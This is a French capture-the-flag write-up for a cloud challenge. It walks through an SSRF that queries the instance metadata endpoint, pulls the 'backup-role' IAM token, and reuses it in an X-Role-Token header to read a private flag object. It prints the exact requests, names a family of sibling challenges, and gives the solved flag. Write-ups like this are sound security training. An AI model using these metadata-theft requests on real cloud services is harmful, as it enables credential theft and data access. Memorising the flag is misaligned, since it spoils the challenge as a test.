# billing-imds (cloud, 490) — RÉSOLU

## Challenge
`billing-imds` — service de facturation cloud. **Piste : SSRF → IMDS → assume-role →
lecture d'objet privé.** Flag sur le FS « served by no route ». Instance par équipe (API JSON).

## Recon
`GET /` → `{"fetch":"/fetch?url=... (reads backup manifests)","objects":"/objects/ (X-Role-Token
required for private keys)","backups_host":"backups.nctf.internal"}`.

## Exploit — SSRF → IMDS → role token → objet privé
1. **SSRF** via `/fetch?url=` (file:// bloqué « host not allowed », mais IP/hosts internes OK) :
   - `/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` →
     expose le rôle **`backup-role`**.
   - `/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/backup-role` →
     `{"AccessKeyId":"ASIANCTFBACKUPROLE","Token":"FwoG...","note":"role backup-role may read private backup objects"}`.
2. **Lecture objet privé** : le token est consommé par le service lui-même via l'entête `X-Role-Token` :
   `curl -H "X-Role-Token: <Token>" /objects/flag` → `{"flag":"NCTF{...}"}`.
   (clé exacte = `flag`, pas `flag (private)`.)

## Famille (même technique, rôle/host différents)
`artifacts-imds` (449), `backup-imds` (495), `cdn-imds` (500) ; variantes `-oidc`/`-envexec`/`-presign`
probablement similaires. Solveur générique : SSRF IMDS → récup token → `/objects/flag` + `X-Role-Token`.

## Flag
`NCTF{6160286625f026849a85dc5e}`
